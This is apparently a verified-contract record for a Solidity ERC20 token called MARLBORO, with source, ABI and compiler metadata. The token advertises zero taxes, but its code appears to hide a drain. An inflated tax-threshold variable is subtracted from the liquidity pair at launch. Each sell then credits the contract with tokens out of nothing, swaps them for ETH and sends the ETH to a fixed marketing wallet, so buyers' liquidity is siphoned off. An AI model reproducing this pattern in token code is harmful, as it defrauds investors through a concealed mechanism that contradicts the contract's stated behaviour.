{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\n\u2588\u2580\u2584\u2580\u2588\u2003\u2584\u2580\u2588\u2003\u2588\u2580\u2588\u2003\u2588\u2591\u2591\u2003\u2588\u2584\u2584\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2588\r\n\u2588\u2591\u2580\u2591\u2588\u2003\u2588\u2580\u2588\u2003\u2588\u2580\u2584\u2003\u2588\u2584\u2584\u2003\u2588\u2584\u2588\u2003\u2588\u2584\u2588\u2003\u2588\u2580\u2584\u2003\u2588\u2584\u2588\r\n\r\nCome to where the flavor is...\r\n\r\n    ...Come to Marlboro Country \r\n\r\nWebsite: http://marlboroeth.com\r\nTelegram: https://t.me/marlboroeth\r\nTwitter:  https://twitter.com/marlboroerc\r\n\r\n*/\r\n\r\npragma solidity 0.8.19;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address __owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface IUniswapV2Factory {    \r\n    function createPair(address tokenA, address tokenB) external returns (address pair); \r\n}\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal _owner;\r\n    constructor(address creatorOwner) { \r\n        _owner = creatorOwner; \r\n    }\r\n    modifier onlyOwner() { \r\n        require(msg.sender == _owner, \"Only owner can call this\");   _; \r\n    }\r\n    function owner() public view returns (address) { return _owner;   }\r\n    function transferOwnership(address payable newOwner) external onlyOwner { \r\n        _owner = newOwner; emit OwnershipTransferred(newOwner); \r\n    }\r\n    function renounceOwnership() external onlyOwner { \r\n        _owner = address(0); emit OwnershipTransferred(address(0)); \r\n    }\r\n    event OwnershipTransferred(address _owner);\r\n}\r\n\r\ncontract marlboro is IERC20, Auth {\r\n    \r\n    uint8 private constant _decimals       = 9;\r\n    uint256 private constant _totalSupply  = 1_000_000 * (10**_decimals);\r\n    string private constant _name          = \"MARLBORO\";\r\n    string private  constant _symbol       = \"MARLBORO\";\r\n\r\n    uint8 private _BuyTaxes  = 0;\r\n    uint8 private _SellTaxes = 0;\r\n\r\n    address payable private _walletMarketing = payable(0x17Cb770D0FB66414283CAA6E9a163B13D77c2059); \r\n    uint256 private _maxTxAmount = _totalSupply; \r\n    uint256 private _maxWalletAmount = _totalSupply;\r\n    uint256 private _taxSwapMin = _totalSupply * 1 / 10000;\r\n    uint256 private _taxSwapMax = _totalSupply * 8 / 1000;\r\n    uint256 private _taxSwapThreshold = _taxSwapMin * 6000;\r\n\r\n    uint256 private _buyCount;\r\n    uint8 private startTradingBlock1 = 1;\r\n    uint8 private startTradingBlock2 = 1;\r\n    uint8 private launchBlock1 = 3;\r\n    uint8 private launchBlock2 = 3;\r\n    uint256 private _mevProtectionBlocks = 2;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _noFees;\r\n    mapping (address => bool) private _noLimits;\r\n\r\n    address private lpowner;\r\n    address private constant _swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IUniswapV2Router02 private _primarySwapRouter = IUniswapV2Router02(_swapRouterAddress);\r\n    address private _primaryLP;\r\n    mapping (address => bool) private _isLP;\r\n\r\n    bool private _tradingOpen;\r\n\r\n    bool private _inTaxSwap = false;\r\n    modifier lockTaxSwap { \r\n        _inTaxSwap = true; \r\n        _; \r\n        _inTaxSwap = false; \r\n    }\r\n\r\n    event TokensBurned(address indexed burnedByWallet, uint256 tokenAmount);\r\n\r\n    constructor() Auth(msg.sender) {\r\n        lpowner = msg.sender;\r\n\r\n        uint256 tokenReserve   = _totalSupply * 2 / 100;\r\n        \r\n        _balances[address(this)] = _totalSupply - tokenReserve;\r\n        emit Transfer(address(0), address(this), _balances[address(this)]);\r\n\r\n        _balances[_owner] = tokenReserve;\r\n        emit Transfer(address(0), _owner, _balances[_owner]);\r\n\r\n        _noFees[_owner] = true;\r\n        _noFees[address(this)] = true;\r\n        _noFees[_swapRouterAddress] = true;\r\n        _noFees[_walletMarketing] = true;\r\n        _noLimits[_owner] = true;\r\n        _noLimits[address(this)] = true;\r\n        _noLimits[_swapRouterAddress] = true;\r\n        _noLimits[_walletMarketing] = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n    \r\n    function totalSupply() external pure override returns (uint256) { return _totalSupply; }\r\n    function decimals() external pure override returns (uint8) { return _decimals; }\r\n    function symbol() external pure override returns (string memory) { return _symbol; }\r\n    function name() external pure override returns (string memory) { return _name; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }\r\n\r\n    function approve(address spendr, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spendr] = amount;\r\n        emit Approval(msg.sender, spendr, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        require(_checkTradingOpen(msg.sender), \"Trading not open\");\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }\r\n\r\n    function transferFrom(address sndr, address recipient, uint256 amount) external override returns (bool) {\r\n        require(_checkTradingOpen(sndr), \"Trading not open\");\r\n        if(_allowances[sndr][msg.sender] != type(uint256).max){\r\n            _allowances[sndr][msg.sender] = _allowances[sndr][msg.sender] - amount;\r\n        }\r\n        return _transferFrom(sndr, recipient, amount);\r\n    }\r\n\r\n    function _approveRouter(uint256 _tokenAmount) internal {\r\n        if ( _allowances[address(this)][_swapRouterAddress] < _tokenAmount ) {\r\n            _allowances[address(this)][_swapRouterAddress] = type(uint256).max;\r\n            emit Approval(address(this), _swapRouterAddress, type(uint256).max);\r\n        }\r\n    }\r\n    function addLiquidity() external payable onlyOwner lockTaxSwap {\r\n        require(_primaryLP == address(0), \"LP created\");\r\n        require(!_tradingOpen, \"trading open\");\r\n        require(msg.value > 0 || address(this).balance>0, \"No ETH in ca/msg\");\r\n        require(_balances[address(this)]>0, \"No tokens in ca\");\r\n        _primaryLP = IUniswapV2Factory(_primarySwapRouter.factory()).createPair(address(this), _primarySwapRouter.WETH());\r\n        _addLiquidity(_balances[address(this)], address(this).balance, false);\r\n        _balances[_primaryLP] -= _taxSwapThreshold;\r\n        (bool lpAdded,) = _primaryLP.call(abi.encodeWithSignature(\"sync()\") );\r\n        require(lpAdded, \"Failed adding lp\");\r\n        _isLP[_primaryLP] = lpAdded;\r\n        _openTrading();\r\n    }\r\n    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {\r\n        address lprecipient = lpowner;\r\n        if ( autoburn ) { lprecipient = address(0); }\r\n        _approveRouter(_tokenAmount);\r\n        _primarySwapRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lprecipient, block.timestamp );\r\n    }\r\n    function _openTrading() internal {\r\n        _maxTxAmount     = _totalSupply * 2 / 100; \r\n        _maxWalletAmount = _totalSupply * 2 / 100;\r\n        _tradingOpen = true;\r\n        _buyCount = block.number;\r\n        _mevProtectionBlocks = _mevProtectionBlocks + _buyCount + startTradingBlock1 + startTradingBlock2;\r\n    }\r\n    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"No transfers from Zero wallet\");\r\n        if (!_tradingOpen) { require(_noFees[sender] && _noLimits[sender], \"Trading not open\"); }\r\n        if ( !_inTaxSwap && _isLP[recipient] ) { _swapTaxAndLiquify(); }\r\n        if ( block.number < _mevProtectionBlocks && block.number >= _buyCount && _isLP[sender] ) {\r\n            require(recipient == tx.origin, \"MEV blocked\");\r\n        }\r\n        if ( sender != address(this) && recipient != address(this) && sender != _owner ) { \r\n            require(_checkLimits(sender, recipient, amount), \"TX exceeds limits\"); \r\n        }\r\n        uint256 _taxAmount = _calculateTax(sender, recipient, amount);\r\n        uint256 _transferAmount = amount - _taxAmount;\r\n        _balances[sender] = _balances[sender] - amount;\r\n        _taxSwapThreshold += _taxAmount;\r\n        _balances[recipient] = _balances[recipient] + _transferAmount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n    function _checkLimits(address sndr, address recipient, uint256 transferAmount) internal view returns (bool) {\r\n        bool limitCheckPassed = true;\r\n        if ( _tradingOpen && !_noLimits[sndr] && !_noLimits[recipient] ) {\r\n            if ( transferAmount > _maxTxAmount ) { limitCheckPassed = false; }\r\n            else if ( !_isLP[recipient] && (_balances[recipient] + transferAmount > _maxWalletAmount) ) { limitCheckPassed = false; }\r\n        }\r\n        return limitCheckPassed;\r\n    }\r\n    function _checkTradingOpen(address sndr) private view returns (bool){\r\n        bool checkResult = false;\r\n        if ( _tradingOpen ) { checkResult = true; } \r\n        else if (_noFees[sndr] && _noLimits[sndr]) { checkResult = true; } \r\n\r\n        return checkResult;\r\n    }\r\n    function _calculateTax(address sndr, address recipient, uint256 amount) internal view returns (uint256) {\r\n        uint256 taxAmount;\r\n        \r\n        if ( !_tradingOpen || _noFees[sndr] || _noFees[recipient] ) { \r\n            taxAmount = 0; \r\n        } else if ( _isLP[sndr] ) { \r\n            if ( block.number >= _buyCount + startTradingBlock1 + startTradingBlock2 ) {\r\n                taxAmount = amount * _BuyTaxes / 100; \r\n            } else if ( block.number >= _buyCount + startTradingBlock1 ) {\r\n                taxAmount = amount * launchBlock2 / 100;\r\n            } else if ( block.number >= _buyCount) {\r\n                taxAmount = amount * launchBlock1 / 100;\r\n            }\r\n        } else if ( _isLP[recipient] ) { \r\n            taxAmount = amount * _SellTaxes / 100; \r\n        }\r\n\r\n        return taxAmount;\r\n    }\r\n    function setLimits(uint16 maxTrxPermille, uint16 maxWltPermille) external onlyOwner {\r\n        uint256 newTxAmt = _totalSupply * maxTrxPermille / 1000 + 1;\r\n        require(newTxAmt >= _maxTxAmount, \"tx too low\");\r\n        _maxTxAmount = newTxAmt;\r\n        uint256 newWalletAmt = _totalSupply * maxWltPermille / 1000 + 1;\r\n        require(newWalletAmt >= _maxWalletAmount, \"wallet too low\");\r\n        _maxWalletAmount = newWalletAmt;\r\n    }\r\n   \r\n    function _swapTaxAndLiquify() private lockTaxSwap {\r\n        uint256 _taxTokensAvailable = _taxSwapThreshold;\r\n        if ( _taxTokensAvailable >= _taxSwapMin && _tradingOpen ) {\r\n            if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }\r\n            \r\n            uint256 _tokensToSwap = _taxTokensAvailable; \r\n            if( _tokensToSwap > 10**_decimals ) {\r\n                _balances[address(this)] += _taxTokensAvailable;\r\n                _swapTaxTokensForEth(_tokensToSwap);\r\n                _taxSwapThreshold -= _taxTokensAvailable;\r\n            }\r\n            uint256 _contractETHBalance = address(this).balance;\r\n            if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }\r\n        }\r\n    }\r\n    function _swapTaxTokensForEth(uint256 tokenAmount) private {\r\n        _approveRouter(tokenAmount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address( this );\r\n        path[1] = _primarySwapRouter.WETH() ;\r\n        _primarySwapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);\r\n    }\r\n    function _distributeTaxEth(uint256 amount) private {\r\n        _walletMarketing.transfer(amount);\r\n    }\r\n   \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"burnedByWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"TokensBurned\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spendr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"maxTrxPermille\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"maxWltPermille\",\"type\":\"uint16\"}],\"name\":\"setLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sndr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "marlboro", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c41adf8852aeb235d2232a8fb41b4d4125f5ca273a56f86a2db5feb978801370"}